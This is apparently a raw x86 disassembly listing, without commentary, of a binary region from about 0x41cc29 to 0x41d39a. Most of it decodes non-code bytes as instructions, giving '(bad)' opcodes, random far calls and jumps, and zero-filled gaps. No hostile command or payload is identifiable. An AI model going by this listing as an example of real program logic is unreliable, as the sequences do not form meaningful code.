  41cc29:	bound  esi,QWORD PTR es:[edx-0x4b9531e]
  41cc30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc31:	call   0xf8dc:0x95a2d2f9
  41cc38:	add    al,bl
  41cc3a:	mov    esp,0x7cd640cb
  41cc3f:	mov    dh,0xbb
  41cc41:	in     eax,dx
  41cc42:	stc    
  41cc43:	cwde   
  41cc44:	retf   
  41cc45:	mov    ds:0xc33c500,al
  41cc4a:	in     eax,dx
  41cc4b:	sbb    DWORD PTR [ebp+0x27],ebp
  41cc4e:	sti    
  41cc4f:	add    eax,0xe14b9701
  41cc54:	call   0x90fb7f27
  41cc59:	mov    BYTE PTR [esi+eax*8-0x8],cl
  41cc5d:	(bad)  
  41cc5f:	xor    dh,dl
  41cc61:	arpl   WORD PTR [ecx],bp
  41cc63:	cmp    dh,dh
  41cc65:	cmp    edi,DWORD PTR [esi+eax*8]
  41cc68:	jle    0x41cc7b
  41cc6a:	bswap  esi
  41cc6c:	mov    esp,0x875b8d79
  41cc71:	jg     0x41cc66
  41cc73:	mov    eax,0xb39a5dc9
  41cc78:	mov    ?,esp
  41cc7a:	popf   
  41cc7b:	nop
  41cc7c:	pop    ss
  41cc7d:	add    BYTE PTR [edx+0x2b],al
  41cc80:	adc    DWORD PTR [bx+si+0x78],ecx
  41cc84:	addr16 in eax,0xd7
  41cc87:	loopne 0x41cccd
  41cc89:	lahf   
  41cc8a:	aad    0x1a
  41cc8c:	or     ah,ah
  41cc8e:	aad    0x52
  41cc90:	mov    eax,0xa8a37f63
  41cc95:	or     bh,BYTE PTR [eax]
  41cc97:	stos   DWORD PTR es:[edi],eax
  41cc98:	jmp    0x41ccfa
  41cc9a:	adc    al,ah
  41cc9c:	icebp  
  41cc9d:	adc    edx,DWORD PTR [edx]
  41cc9f:	fisubr DWORD PTR [edx+eax*2+0x7e]
  41cca3:	imul   ebx,esp,0x39
  41cca6:	cwde   
  41cca7:	ins    DWORD PTR es:[edi],dx
  41cca8:	adc    bl,dh
  41ccaa:	fisttp DWORD PTR [eax]
  41ccac:	jmp    0x41cc7e
  41ccae:	int    0xa3
  41ccb0:	cmp    BYTE PTR [edx+eax*4+0x15],al
  41ccb4:	nop
  41ccb5:	jl     0x41ccb7
	...
  41ccc3:	add    dh,al
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	loope  0x41cd19
  41ccd2:	xchg   dl,bl
  41ccd4:	add    DWORD PTR [ecx+0xaa0001],ecx
  41ccda:	add    BYTE PTR [eax],al
  41ccdc:	jg     0x41cd5c
  41ccde:	div    DWORD PTR [ebx]
  41cce0:	inc    edx
  41cce1:	xor    edx,0xffffffe0
  41cce4:	jge    0x41cd19
  41cce6:	jno    0x41cc92
  41cce8:	mov    edi,0xffc114c4
  41cced:	int3   
  41ccee:	jp     0x41ccc1
  41ccf0:	pop    edi
  41ccf1:	iret   
  41ccf2:	(bad)  
  41ccf3:	mov    bh,dh
  41ccf5:	push   edx
  41ccf6:	xchg   esi,eax
  41ccf7:	idiv   DWORD PTR [edx+0x0]
  41ccfa:	mov    eax,ds:0xb4cac4f0
  41ccff:	jb     0x41cc97
  41cd01:	mov    WORD PTR [esi],?
  41cd03:	(bad)  
  41cd04:	pushf  
  41cd05:	in     al,dx
  41cd06:	add    dh,BYTE PTR gs:[ebx-0x50207cf7]
  41cd0d:	add    dl,BYTE PTR [ecx-0x44b28165]
  41cd13:	pop    es
  41cd14:	pushf  
  41cd15:	lds    edx,FWORD PTR [eax]
  41cd17:	xchg   DWORD PTR [ebp+0x2cc39ca1],eax
  41cd1d:	inc    eax
  41cd1e:	test   BYTE PTR [eax-0x5e0729b0],al
  41cd24:	jo     0x41cccc
  41cd26:	push   ss
  41cd27:	repz popf 
  41cd29:	out    0xb1,al
  41cd2b:	mov    ecx,0x277867b8
  41cd30:	hlt    
  41cd31:	add    DWORD PTR [eax],ebp
  41cd33:	pop    ecx
  41cd34:	xchg   ebx,eax
  41cd35:	adc    ebp,0xbaeec414
  41cd3b:	push   eax
  41cd3c:	jne    0x41cdb2
  41cd3e:	imul   ebx,DWORD PTR [esi],0x91856703
  41cd44:	or     BYTE PTR [ebp-0x5e0e153],ch
  41cd4a:	data16 repnz test ah,al
  41cd4e:	fs test eax,0x54fc5cd1
  41cd54:	test   al,0xe
  41cd56:	cmp    al,BYTE PTR [eax+0x15b46197]
  41cd5c:	cmp    eax,0x81f64bdf
  41cd61:	lods   al,BYTE PTR ds:[esi]
  41cd62:	push   ecx
  41cd63:	and    al,0x7e
  41cd65:	jns    0x41cd77
  41cd67:	adc    al,0xef
  41cd69:	push   0x58
  41cd6b:	jmp    0x7065185d
  41cd70:	jle    0x41ccf7
  41cd72:	mov    dl,0x5
  41cd74:	push   DWORD PTR [ecx-0x5d3d7363]
  41cd7a:	(bad)  
  41cd7b:	mov    al,ds:0x58f4f5e2
  41cd80:	xor    BYTE PTR [ebx+ebp*2],dh
  41cd83:	xor    dl,BYTE PTR [ebx]
  41cd85:	xchg   edi,eax
	...
  41cd92:	add    BYTE PTR [eax],al
  41cd94:	push   edx
  41cd95:	xor    al,0x40
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0x916a4e09
  41cda1:	loopne 0x41cd2d
  41cda3:	mov    ch,BYTE PTR [ebx-0x55fffe77]
  41cda9:	add    BYTE PTR [eax],al
  41cdab:	add    BYTE PTR ds:0xd260572f,ch
  41cdb1:	or     eax,0x5f3632b1
  41cdb6:	xor    bl,BYTE PTR [ebx]
  41cdb8:	test   BYTE PTR [esi-0x3d9fe767],ch
  41cdbe:	mov    ch,0xf7
  41cdc0:	pop    ebp
  41cdc1:	adc    BYTE PTR [ebx+ebx*1+0x369445f9],ah
  41cdc8:	or     edx,DWORD PTR [edi-0x5e]
  41cdcb:	pop    esi
  41cdcc:	push   0x8a59aeac
  41cdd1:	lods   al,BYTE PTR ds:[esi]
  41cdd2:	fld    DWORD PTR [ebp-0x1012e1a9]
  41cdd8:	mov    ah,0x77
  41cdda:	pop    eax
  41cddb:	jecxz  0x41cdf6
  41cddd:	adc    DWORD PTR [ecx],ecx
  41cddf:	sar    ebp,1
  41cde1:	and    edx,ecx
  41cde3:	dec    ecx
  41cde5:	repnz test ebp,ebp
  41cde8:	mov    ah,0x31
  41cdea:	pop    ecx
  41cdeb:	bound  ecx,QWORD PTR [eax+0xa]
  41cdee:	les    ebp,FWORD PTR [edx+0x34]
  41cdf1:	mov    eax,ss:0x414f7344
  41cdf7:	xchg   esp,eax
  41cdf8:	iret   
  41cdf9:	aas    
  41cdfa:	cli    
  41cdfb:	xor    ch,BYTE PTR ds:[esi]
  41cdfe:	cli    
  41cdff:	lods   eax,DWORD PTR ds:[esi]
  41ce00:	mov    ds:0xd52ef9b4,al
  41ce05:	std    
  41ce06:	outs   dx,DWORD PTR ds:[esi]
  41ce07:	mov    al,ah
  41ce09:	pop    eax
  41ce0a:	fisttp QWORD PTR ss:[ecx]
  41ce0d:	das    
  41ce0e:	mov    ds:0xd4d016a,al
  41ce13:	in     al,0xcd
  41ce15:	imul   esp,DWORD PTR [edi+0x50],0xfffffff9
  41ce19:	adc    BYTE PTR [edx+0x1ea52df0],dl
  41ce1f:	test   bh,bh
  41ce21:	test   al,0x98
  41ce23:	mov    al,ds:0x75382095
  41ce28:	out    0x6c,al
  41ce2a:	dec    edi
  41ce2b:	aam    0xee
  41ce2d:	mov    dl,BYTE PTR [ebx]
  41ce2f:	inc    eax
  41ce30:	xor    esi,ecx
  41ce32:	iret   
  41ce33:	dec    esp
  41ce34:	(bad)  
  41ce35:	fisub  WORD PTR [edx-0x67909455]
  41ce3b:	ret    0xca5c
  41ce3e:	xchg   DWORD PTR [ecx],edx
  41ce40:	inc    eax
  41ce41:	data16 jno 0x41ce9b
  41ce44:	push   es
  41ce45:	test   eax,0x8c6cd4f0
  41ce4a:	or     edx,ebx
  41ce4c:	inc    edi
  41ce4d:	(bad)  [ecx]
  41ce4f:	loope  0x41ce56
  41ce51:	enter  0xa6f,0xb7
  41ce55:	pop    esp
	...
  41ce62:	add    BYTE PTR [eax],al
  41ce64:	dec    ecx
  41ce65:	inc    esi
  41ce66:	sub    BYTE PTR [eax],dh
  41ce68:	das    
  41ce69:	jle    0x41cec4
  41ce6b:	jg     0x41ce33
  41ce6d:	imul   esi,eax,0xffffffd5
  41ce70:	or     al,0x4a
  41ce72:	arpl   ax,ax
  41ce74:	fild   QWORD PTR [edx+0xaa0001]
  41ce7a:	add    BYTE PTR [eax],al
  41ce7c:	jnp    0x41ce45
  41ce7e:	pop    ss
  41ce7f:	fsub   DWORD PTR [edi-0x3b]
  41ce82:	div    BYTE PTR [ebp+ecx*1-0x44]
  41ce86:	icebp  
  41ce87:	push   esi
  41ce88:	lock cmp DWORD PTR [esi+0x72],edx
  41ce8c:	adc    cl,cl
  41ce8e:	sahf   
  41ce8f:	std    
  41ce90:	adc    cl,BYTE PTR [ebp+0x43707824]
  41ce96:	fisubr WORD PTR [eax+0x41f324de]
  41ce9c:	std    
  41ce9d:	(bad)
  41cea0:	or     ebx,0x6c
  41cea3:	int3   
  41cea4:	jl     0x41cee8
  41cea6:	jp     0x41cedb
  41cea8:	bound  esi,QWORD PTR [esi]
  41ceaa:	cmp    DWORD PTR [edx+0x21af86ec],ebp
  41ceb0:	add    eax,0xb0818658
  41ceb5:	inc    ebx
  41ceb6:	int    0xdd
  41ceb8:	mov    bh,0xd5
  41ceba:	mov    eax,0xed8f67a0
  41cebf:	or     eax,0xe3c7077e
  41cec4:	mov    eax,0xdab545a1
  41cec9:	setbe  BYTE PTR [ebx+0x30]
  41cecd:	pop    ss
  41cece:	stos   BYTE PTR es:[edi],al
  41cecf:	call   0x99a5:0x3ab7f4e4
  41ced6:	test   al,0x38
  41ced8:	push   eax
  41ced9:	xor    esi,DWORD PTR [ecx]
  41cedb:	jmp    0x787a:0x126f825c
  41cee2:	push   ebp
  41cee3:	jae    0x41ceb6
  41cee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cee6:	pop    esp
  41cee7:	xchg   ebp,eax
  41cee8:	mov    ecx,0x24183d10
  41ceed:	inc    ebp
  41ceee:	mov    ch,dh
  41cef0:	(bad)  [ecx+0x8]
  41cef3:	in     al,0x59
  41cef5:	int    0x5f
  41cef7:	dec    ecx
  41cef8:	mov    eax,ds:0xa6ba8f31
  41cefd:	mov    bh,0x26
  41ceff:	xor    ebx,ebp
  41cf01:	(bad)  
  41cf02:	xor    eax,0x76fe6dd7
  41cf07:	rol    DWORD PTR ds:0xf128a40b,cl
  41cf0d:	jecxz  0x41cea4
  41cf0f:	lahf   
  41cf10:	jnp    0x41cef4
  41cf12:	xchg   ebx,eax
  41cf13:	mov    ds:0x5d1dcf9b,eax
  41cf18:	icebp  
  41cf19:	in     eax,dx
  41cf1a:	lods   eax,DWORD PTR ds:[esi]
  41cf1b:	sbb    ebp,DWORD PTR [ebx+0x72c9f59b]
  41cf21:	lds    esp,FWORD PTR [edx+eiz*2]
  41cf24:	fstp   DWORD PTR [edi]
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	addr16 (bad) 
  41cf36:	and    dh,dh
  41cf38:	mov    eax,ds:0xe7d7f7f6
  41cf3d:	mov    eax,0x197ada72
  41cf42:	xor    al,0x9d
  41cf44:	mov    DWORD PTR [ebx+0xaa0001],ebp
  41cf4a:	add    BYTE PTR [eax],al
  41cf4c:	test   al,0xc1
  41cf4e:	stc    
  41cf4f:	stc    
  41cf50:	fcom   QWORD PTR [eax+0x570b8993]
  41cf56:	mov    esi,0x6c4041bc
  41cf5b:	cwde   
  41cf5c:	mov    cl,0xe0
  41cf5e:	jo     0x41cf0e
  41cf60:	loope  0x41cf7e
  41cf62:	retf   
  41cf63:	repnz jecxz 0x41cf92
  41cf66:	add    eax,0x64df335b
  41cf6b:	loope  0x41cfbc
  41cf6d:	mov    edi,0x4b1d583
  41cf72:	je     0x41cf5a
  41cf74:	pop    edi
  41cf75:	pop    esp
  41cf76:	sub    al,0xdd
  41cf78:	call   0xcdc7c727
  41cf7d:	mov    dh,0x9b
  41cf7f:	xchg   edx,eax
  41cf80:	rep outs dx,DWORD PTR ds:[esi]
  41cf82:	test   DWORD PTR [edx-0x37],ecx
  41cf85:	mov    bh,0x61
  41cf87:	push   0x7489a25c
  41cf8c:	or     bl,BYTE PTR [esi-0x55]
  41cf8f:	xchg   DWORD PTR [edx+eax*2],edx
  41cf92:	jl     0x41cf61
  41cf94:	dec    eax
  41cf95:	jl     0x41cfe4
  41cf97:	sbb    BYTE PTR [ecx*4+0x5a37657],0x6a
  41cf9f:	sbb    al,0xd2
  41cfa2:	pop    esp
  41cfa3:	repz jp 0x41cf9b
  41cfa6:	xchg   edx,eax
  41cfa7:	or     al,0x55
  41cfa9:	les    edx,FWORD PTR [eax-0x2ae702dd]
  41cfaf:	or     al,0xd8
  41cfb1:	xor    eax,0xdc2461c0
  41cfb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfb7:	sbb    BYTE PTR [ecx],dl
  41cfb9:	repnz mov esp,DWORD PTR [eax+esi*1-0x325573ad]
  41cfc1:	and    DWORD PTR [esi-0x2f],0x5c
  41cfc5:	mov    BYTE PTR [eax],dl
  41cfc7:	inc    eax
  41cfc8:	xor    eax,0x54950494
  41cfcd:	mov    ds:0x74c342ad,eax
  41cfd2:	daa    
  41cfd3:	fwait
  41cfd4:	xchg   edi,eax
  41cfd5:	push   0xffffffbd
  41cfd7:	push   esi
  41cfd8:	cmp    dl,BYTE PTR [edx-0x1f]
  41cfdb:	addr16 sbb al,0x41
  41cfde:	add    bl,BYTE PTR [ecx+0x4d]
  41cfe1:	push   edx
  41cfe2:	(bad)  
  41cfe3:	idiv   DWORD PTR [ebx-0x56]
  41cfe6:	out    0x13,eax
  41cfe8:	out    dx,al
  41cfe9:	jno    0x41d01e
  41cfeb:	dec    edi
  41cfec:	imul   edx,esp,0x3a
  41cfef:	scas   eax,DWORD PTR es:[edi]
  41cff0:	loop   0x41cfd4
  41cff2:	(bad)  
  41cff4:	and    ch,dl
	...
  41d002:	add    BYTE PTR [eax],al
  41d004:	ret    
  41d005:	or     eax,0xefee66a6
  41d00a:	ret    
  41d00b:	lods   eax,DWORD PTR ds:[esi]
  41d00c:	sub    al,0xb8
  41d00e:	mov    ds:0xeb257847,eax
  41d013:	pop    ebp
  41d014:	xor    ebp,DWORD PTR [ecx+eax*1+0xaa00]
  41d01b:	add    BYTE PTR [edx],bh
  41d01d:	iret   
  41d01e:	repnz clc 
  41d020:	retf   0x6b98
  41d023:	mov    al,ds:0xa8b1f07f
  41d028:	ret    
  41d029:	add    BYTE PTR [eax+esi*1-0x44144129],al
  41d030:	sbb    ebx,ebp
  41d032:	in     eax,dx
  41d033:	dec    edx
  41d034:	rcl    dl,0x73
  41d037:	push   edx
  41d038:	xchg   ecx,eax
  41d039:	sbb    dl,cl
  41d03b:	sub    ah,BYTE PTR [ecx+0x5c]
  41d03e:	dec    ebp
  41d03f:	xchg   BYTE PTR [eax-0x28],dl
  41d042:	jge    0x41d094
  41d044:	cmp    DWORD PTR [ebp-0x7e78bfed],edi
  41d04a:	in     al,0x80
  41d04c:	nop
  41d04d:	in     eax,dx
  41d04e:	fdiv   QWORD PTR [edi+0x24]
  41d051:	sub    bl,bl
  41d053:	and    eax,0x96581656
  41d058:	ss icebp 
  41d05a:	xlat   BYTE PTR ds:[ebx]
  41d05b:	inc    ebx
  41d05c:	scas   al,BYTE PTR es:[edi]
  41d05d:	or     ah,BYTE PTR [edi]
  41d05f:	mov    ah,0x14
  41d061:	and    cl,BYTE PTR [ecx+ebp*8-0x4c]
  41d065:	pop    es
  41d066:	mov    ebx,0xc681b402
  41d06b:	mov    ds:0x73617788,al
  41d070:	rcr    BYTE PTR [edx+0x3d2e2d04],0xda
  41d077:	xchg   al,bl
  41d079:	inc    esp
  41d07a:	out    dx,eax
  41d07b:	fsub   QWORD PTR [eax+0x13]
  41d07e:	call   0x375249e8
  41d083:	(bad)  
  41d084:	dec    esi
  41d085:	inc    edx
  41d086:	jle    0x41d049
  41d088:	fninit 
  41d08a:	jno    0x41d03a
  41d08c:	dec    eax
  41d08d:	aas    
  41d08e:	and    al,0xb1
  41d090:	add    ebp,DWORD PTR [ecx+edx*2+0x39]
  41d094:	rcl    eax,cl
  41d096:	or     cl,BYTE PTR [esi]
  41d098:	cli    
  41d099:	inc    ebp
  41d09a:	mov    esp,DWORD PTR [esi-0x4f]
  41d09d:	fild   QWORD PTR [esi-0x112c7fd]
  41d0a3:	(bad)  
  41d0a4:	retf   
  41d0a5:	int3   
  41d0a6:	es sub al,0x7f
  41d0a9:	xor    al,0xdc
  41d0ab:	fucom  st(7)
  41d0ad:	mov    edi,0x6535dd91
  41d0b2:	xchg   ecx,eax
  41d0b3:	adc    eax,0xe7fd108c
  41d0b8:	call   0x8ed4:0x680f39b5
  41d0bf:	lock lock and eax,0xb4aa4563
	...
  41d0d2:	add    BYTE PTR [eax],al
  41d0d4:	fld    st(2)
  41d0d6:	add    eax,0xddcf1f49
  41d0db:	ror    al,cl
  41d0dd:	outs   dx,DWORD PTR ds:[esi]
  41d0de:	clc    
  41d0df:	ror    BYTE PTR [eax],cl
  41d0e1:	push   edi
  41d0e2:	push   es
  41d0e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0e4:	(bad)  [ecx+eax*1+0xaa00]
  41d0eb:	add    BYTE PTR [esi+eax*4+0x44],ch
  41d0ef:	out    0xbb,al
  41d0f1:	pop    esi
  41d0f2:	inc    edx
  41d0f3:	mov    ecx,DWORD PTR [edx+ebx*8+0x7eae086]
  41d0fa:	out    dx,eax
  41d0fb:	mov    ch,0x77
  41d0fd:	xchg   ebp,eax
  41d0fe:	cmc    
  41d0ff:	iret   
  41d100:	retf   
  41d101:	ja     0x41d085
  41d103:	into   
  41d104:	mov    BYTE PTR [ebp+eiz*4-0x2f],bl
  41d108:	aad    0xef
  41d10a:	cmp    DWORD PTR [esi],edx
  41d10c:	adc    eax,0xd81985
  41d111:	cmp    BYTE PTR [ebp+0x12],ch
  41d114:	cmp    eax,0xecaa6587
  41d119:	push   esi
  41d11a:	cmp    eax,0xab6c5407
  41d11f:	sbb    bh,0x36
  41d122:	mov    esi,0xbaacadf
  41d127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d128:	pop    ebp
  41d129:	push   cs
  41d12a:	pop    edi
  41d12b:	sbb    eax,0x49cb521d
  41d130:	jnp    0xfc3842aa
  41d136:	mov    al,ds:0x55b3a7a0
  41d13b:	aad    0x49
  41d13d:	cmp    DWORD PTR [esi-0xf],edi
  41d140:	int    0x91
  41d142:	jl     0x41d143
  41d144:	mov    edx,0xefe9e25b
  41d149:	dec    esi
  41d14a:	fcomi  st,st(1)
  41d14c:	inc    ebp
  41d14d:	cmp    cl,0x33
  41d150:	retf   
  41d151:	leave  
  41d152:	inc    esi
  41d153:	mov    ds,WORD PTR [edi-0x120b6af8]
  41d159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d15a:	hlt    
  41d15b:	imul   ecx,DWORD PTR [ecx-0x3b],0xe
  41d15f:	test   DWORD PTR [esi-0x18],edi
  41d162:	ds test al,0x9e
  41d165:	bound  esi,QWORD PTR [edx+0x419c7594]
  41d16b:	lods   eax,DWORD PTR ds:[esi]
  41d16c:	jg     0x41d1c5
  41d16e:	mov    edx,0xfec03c39
  41d173:	adc    DWORD PTR [ebp+0x2e6ebe73],0x42255f85
  41d17d:	mov    esp,0xc15d9bbb
  41d182:	dec    ebp
  41d183:	add    DWORD PTR [ecx+ebx*8],esi
  41d186:	lock push edx
  41d188:	lods   al,BYTE PTR ds:[esi]
  41d189:	rcr    bh,cl
  41d18b:	iret   
  41d18c:	jb     0x41d200
  41d18e:	push   ebp
  41d18f:	add    ebp,DWORD PTR [edi+0x45]
  41d192:	jmp    0x13932b5
	...
  41d1a3:	add    BYTE PTR [ecx+0x5f],ah
  41d1a6:	lock (bad) 
  41d1a8:	(bad)  
  41d1a9:	out    dx,eax
  41d1aa:	repz pop edi
  41d1ac:	mov    dl,0xc5
  41d1ae:	ret    
  41d1af:	in     eax,dx
  41d1b0:	sbb    esi,esi
  41d1b2:	(bad)  
  41d1b3:	push   ebp
  41d1b4:	xchg   DWORD PTR [ebp+0x130001],ebp
  41d1ba:	add    BYTE PTR [eax],al
  41d1bc:	add    ecx,ebp
  41d1be:	les    esi,FWORD PTR [edi-0x5293c7df]
  41d1c4:	and    esi,ebp
  41d1c6:	es or  dl,ah
  41d1c9:	mov    esi,0x2f0abc0f
  41d1ce:	sbb    al,BYTE PTR [eax]
  41d1d0:	add    BYTE PTR [eax],al
  41d1d2:	add    BYTE PTR [eax],al
  41d1d4:	add    BYTE PTR [eax+0x42],ah
  41d1d7:	add    BYTE PTR [eax+eiz*2],al
  41d1da:	inc    edx
  41d1db:	add    BYTE PTR [eax],cl
  41d1dd:	pusha  
  41d1de:	inc    edx
  41d1df:	add    BYTE PTR [eax+eiz*2],cl
  41d1e2:	inc    edx
  41d1e3:	add    BYTE PTR [eax],dl
  41d1e5:	pusha  
  41d1e6:	inc    edx
  41d1e7:	add    BYTE PTR [eax+eiz*2],dl
  41d1ea:	inc    edx
  41d1eb:	add    BYTE PTR [eax],bl
  41d1ed:	pusha  
  41d1ee:	inc    edx
  41d1ef:	add    BYTE PTR [eax+eiz*2],bl
  41d1f2:	inc    edx
  41d1f3:	add    BYTE PTR [eax],al
  41d1f5:	jo     0x41d239
  41d1f7:	add    BYTE PTR [eax+esi*2],al
  41d1fa:	inc    edx
  41d1fb:	add    BYTE PTR [eax],cl
  41d1fd:	jo     0x41d241
  41d1ff:	add    BYTE PTR [eax+esi*2],cl
  41d202:	inc    edx
  41d203:	add    BYTE PTR [eax],dl
  41d205:	jo     0x41d249
  41d207:	add    BYTE PTR [eax+esi*2],dl
  41d20a:	inc    edx
  41d20b:	add    BYTE PTR [eax],bl
  41d20d:	jo     0x41d251
  41d20f:	add    BYTE PTR [eax+esi*2],bl
  41d212:	inc    edx
  41d213:	add    BYTE PTR [eax],al
  41d215:	add    BYTE PTR [edx+0x0],0x4
  41d219:	add    BYTE PTR [edx+0x0],0x8
  41d21d:	add    BYTE PTR [edx+0x0],0xc
  41d221:	add    BYTE PTR [edx+0x0],0x10
  41d225:	add    BYTE PTR [edx+0x0],0x14
  41d229:	add    BYTE PTR [edx+0x0],0x18
  41d22d:	add    BYTE PTR [edx+0x0],0x1c
  41d231:	add    BYTE PTR [edx+0x0],0x78
  41d235:	data16 ins BYTE PTR es:[edi],dx
  41d237:	jp     0x41d290
  41d239:	jbe    0x41d282
  41d23b:	ja     0x41d280
  41d23d:	js     0x41d287
  41d23f:	jno    0x41d291
  41d241:	arpl   WORD PTR [ebx+0x6f],dx
  41d244:	inc    edi
  41d245:	dec    esi
  41d246:	outs   dx,DWORD PTR ds:[esi]
  41d247:	pop    ecx
  41d248:	inc    edi
  41d249:	jb     0x41d292
  41d24b:	jns    0x41d2c3
  41d24d:	inc    ecx
  41d24e:	pop    eax
  41d24f:	dec    esp
  41d250:	add    BYTE PTR [eax],al
  41d252:	add    BYTE PTR [eax],al
  41d254:	(bad)  
  41d256:	inc    ecx
  41d257:	add    ah,ah
  41d259:	aad    0x41
  41d25b:	add    BYTE PTR [esp+edx*8+0xbef0041],bl
  41d262:	mov    dl,0xe
  41d264:	jns    0x41d2b4
  41d266:	xor    BYTE PTR [esi-0x79],cl
  41d269:	dec    edi
  41d26a:	cmp    eax,0x3e4faf4e
  41d26f:	dec    esi
  41d270:	js     0x41d2c0
  41d272:	cmp    ecx,DWORD PTR [esi-0x64]
  41d275:	dec    edi
  41d276:	inc    esp
  41d277:	dec    esi
  41d278:	jae    0x41d2c8
  41d27a:	inc    ecx
  41d27b:	dec    esi
  41d27c:	xor    BYTE PTR [esi+0x40],cl
  41d27f:	dec    esi
  41d280:	pop    esp
  41d281:	pop    ebp
  41d282:	pop    edi
  41d283:	push   edx
  41d284:	cmp    DWORD PTR [esi+0x79],ecx
  41d287:	dec    esi
  41d288:	xor    BYTE PTR [esi-0x79],cl
  41d28b:	dec    edi
  41d28c:	cmp    eax,0x3e4faf4e
  41d291:	dec    esi
  41d292:	js     0x41d2e2
  41d294:	cmp    ecx,DWORD PTR [esi-0x64]
  41d297:	dec    edi
  41d298:	inc    esp
  41d299:	dec    esi
  41d29a:	mov    DWORD PTR [edi+0x41],ecx
  41d29d:	dec    esi
  41d29e:	xor    BYTE PTR [esi+0x40],cl
  41d2a1:	dec    esi
  41d2a2:	pop    esp
  41d2a3:	ins    DWORD PTR es:[edi],dx
  41d2a4:	pop    edi
  41d2a5:	bound  edi,QWORD PTR [ecx]
  41d2a7:	dec    esi
  41d2a8:	jns    0x41d2f8
  41d2aa:	xor    BYTE PTR [esi-0x80],cl
  41d2ad:	dec    edi
  41d2ae:	cmp    eax,0x394e734e
  41d2b3:	dec    esi
  41d2b4:	mov    ds:0x304e3a4f,al
  41d2b9:	dec    esi
  41d2ba:	inc    esi
  41d2bb:	dec    esi
  41d2bc:	pop    esp
  41d2bd:	jge    0x41d31e
  41d2bf:	jb     0x41d330
  41d2c1:	sub    BYTE PTR [esi-0x7d],0x7e
  41d2c5:	xchg   ebx,eax
  41d2c6:	jns    0x41d258
  41d2c8:	aas    
  41d2c9:	dec    esi
  41d2ca:	test   BYTE PTR [edi+0x30],cl
  41d2cd:	dec    esi
  41d2ce:	test   BYTE PTR [edi+0x3c],cl
  41d2d1:	dec    esi
  41d2d2:	mov    ds:0x734e394f,al
  41d2d7:	dec    esi
  41d2d8:	inc    ebp
  41d2d9:	dec    esi
  41d2da:	xor    BYTE PTR [esi+0x44],cl
  41d2dd:	dec    esi
  41d2de:	pop    esp
  41d2df:	lea    ebx,[edi-0x7e]
  41d2e2:	outs   dx,DWORD PTR ds:[esi]
  41d2e3:	xchg   edx,eax
  41d2e4:	outs   dx,BYTE PTR ds:[esi]
  41d2e5:	xchg   ebx,eax
  41d2e6:	jle    0x41d28b
  41d2e8:	jns    0x41d28a
  41d2ea:	aas    
  41d2eb:	dec    esi
  41d2ec:	test   BYTE PTR [edi+0x30],cl
  41d2ef:	dec    esi
  41d2f0:	test   BYTE PTR [edi+0x3c],cl
  41d2f3:	dec    esi
  41d2f4:	mov    ds:0x894e394f,al
  41d2f9:	dec    edi
  41d2fa:	inc    ebp
  41d2fb:	dec    esi
  41d2fc:	xor    BYTE PTR [esi+0x44],cl
  41d2ff:	dec    esi
  41d300:	pop    esp
  41d301:	popf   
  41d302:	pop    edi
  41d303:	xchg   edx,eax
  41d304:	outs   dx,DWORD PTR ds:[esi]
  41d305:	mov    ds:0xb37ea36e,al
  41d30a:	jns    0x41d2bc
  41d30c:	aas    
  41d30d:	dec    esi
  41d30e:	mov    cs,WORD PTR [edi+0x30]
  41d311:	dec    esi
  41d312:	lods   al,BYTE PTR ds:[esi]
  41d313:	dec    edi
  41d314:	cmp    eax,0x394e734e
  41d319:	dec    esi
  41d31a:	mov    eax,ds:0x304e3a4f
  41d31f:	dec    esi
  41d320:	inc    esp
  41d321:	dec    esi
  41d322:	pop    esp
  41d323:	lods   eax,DWORD PTR ds:[esi]
  41d324:	pop    edi
  41d325:	mov    ds:0xb36eb26f,al
  41d32a:	jle    0x41d2ef
  41d32c:	jns    0x41d2ee
  41d32e:	aas    
  41d32f:	dec    esi
  41d330:	mov    cs,WORD PTR [edi+0x30]
  41d333:	dec    esi
  41d334:	lods   al,BYTE PTR ds:[esi]
  41d335:	dec    edi
  41d336:	cmp    eax,0x394e7e4e
  41d33b:	dec    esi
  41d33c:	lahf   
  41d33d:	dec    edi
  41d33e:	cmp    ecx,DWORD PTR [esi+0x30]
  41d341:	dec    esi
  41d342:	inc    ebp
  41d343:	dec    esi
  41d344:	pop    esp
  41d345:	mov    ebp,0xc26fb25f
  41d34a:	outs   dx,BYTE PTR ds:[esi]
  41d34b:	ret    
  41d34c:	jle    0x41d321
  41d34e:	jns    0x41d320
  41d350:	aas    
  41d351:	dec    esi
  41d352:	mov    cs,WORD PTR [edi+0x30]
  41d355:	dec    esi
  41d356:	lods   al,BYTE PTR ds:[esi]
  41d357:	dec    edi
  41d358:	cmp    eax,0x394f804e
  41d35d:	dec    esi
  41d35e:	lods   al,BYTE PTR ds:[esi]
  41d35f:	dec    edi
  41d360:	cmp    cl,BYTE PTR [esi+0x30]
  41d363:	dec    esi
  41d364:	inc    esi
  41d365:	dec    esi
  41d366:	pop    esp
  41d367:	int    0x5f
  41d369:	ret    0xd26f
  41d36c:	outs   dx,BYTE PTR ds:[esi]
  41d36d:	sar    DWORD PTR [esi-0x1d],cl
  41d370:	jns    0x41d352
  41d372:	aas    
  41d373:	dec    esi
  41d374:	mov    cs,WORD PTR [edi+0x30]
  41d377:	dec    esi
  41d378:	lods   al,BYTE PTR ds:[esi]
  41d379:	dec    edi
  41d37a:	cmp    eax,0x394f834e
  41d37f:	dec    esi
  41d380:	mov    ds:0x304e3a4f,al
  41d385:	dec    esi
  41d386:	inc    esp
  41d387:	dec    esi
  41d388:	pop    esp
  41d389:	fstp   QWORD PTR [edi-0x2e]
  41d38c:	outs   dx,DWORD PTR ds:[esi]
  41d38d:	loop   0x41d3fd
  41d38f:	jecxz  0x41d40f
  41d391:	repz jns 0x41d384
  41d394:	aas    
  41d395:	dec    esi
  41d396:	lea    ecx,[edi+0x30]
  41d399:	dec    esi
  41d39a:	lahf   
